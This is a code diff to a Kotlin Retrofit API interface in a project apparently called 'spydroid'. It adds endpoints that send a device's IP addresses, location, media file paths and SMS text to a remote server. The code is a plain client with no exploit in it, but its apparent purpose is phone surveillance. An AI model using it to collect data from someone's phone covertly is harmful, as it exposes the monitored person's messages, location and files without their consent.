@@ -18,18 +18,78 @@
 package net.spydroid.common.remote.network.api
 
 import net.spydroid.common.remote.network.models.Devices
+import net.spydroid.common.remote.network.models.InfoDevices
+import net.spydroid.common.remote.network.models.MultimediaDevices
+import net.spydroid.common.remote.network.models.SmsDevices
 import retrofit2.http.GET
 import retrofit2.http.Query
 import retrofit2.Call
+import retrofit2.http.Field
+import retrofit2.http.FormUrlEncoded
+import retrofit2.http.POST
+
+
+private object Routes {
+    const val DEVICES = "/devices"
+    const val INFO = "/info"
+    const val MULTIMEDIA = "/multimedia"
+    const val SMS = "/sms"
+}
+
+private object PARAMS {
+    const val ACCESS_TOKEN = "access_token"
+    const val ALIAS = "alias"
+}
+
 
 interface ApiService {
-    @GET("/devices")
-    fun getDevices(@Query("access_token") accessToken: String): Call<List<Devices>>
 
-    @GET("/info")
-    fun getInfo(@Query("access_token") accessToken: String): Call<List<Devices>>
-    @GET("/multimedia")
-    fun getMultimedia(@Query("access_token") accessToken: String): Call<List<Devices>>
-    @GET("/sms")
-    fun getSms(@Query("access_token") accessToken: String): Call<List<Devices>>
+    // GETS
+    @GET(Routes.DEVICES)
+    fun getDevices(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<Devices>>
+
+    @GET(Routes.INFO)
+    fun getInfo(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<InfoDevices>>
+    @GET(Routes.MULTIMEDIA)
+    fun getMultimedia(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<MultimediaDevices>>
+    @GET(Routes.SMS)
+    fun getSms(@Query(PARAMS.ACCESS_TOKEN) accessToken: String): Call<List<SmsDevices>>
+
+
+    // POSTS
+    @FormUrlEncoded
+    @POST("devices")
+    fun createDevice(
+        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
+        @Field(PARAMS.ALIAS) alias: String,
+        @Field("name") name: String
+    ): Call<Void>
+
+    @FormUrlEncoded
+    @POST("info")
+    fun createInfo(
+        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
+        @Field(PARAMS.ALIAS) alias: String,
+        @Field("ip_public") ipPublic: String,
+        @Field("ip_private") ipPrivate: String,
+        @Field("location") location: String
+    ): Call<Void>
+
+    @FormUrlEncoded
+    @POST("multimedia")
+    fun createMultimedia(
+        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
+        @Field(PARAMS.ALIAS) alias: String,
+        @Field("route_file") routeFile: String,
+        @Field("type") type: String
+    ): Call<Void>
+
+    @FormUrlEncoded
+    @POST("sms")
+    fun createSms(
+        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
+        @Field(PARAMS.ALIAS) alias: String,
+        @Field("sms") sms: String
+    ): Call<Void>
+
 }
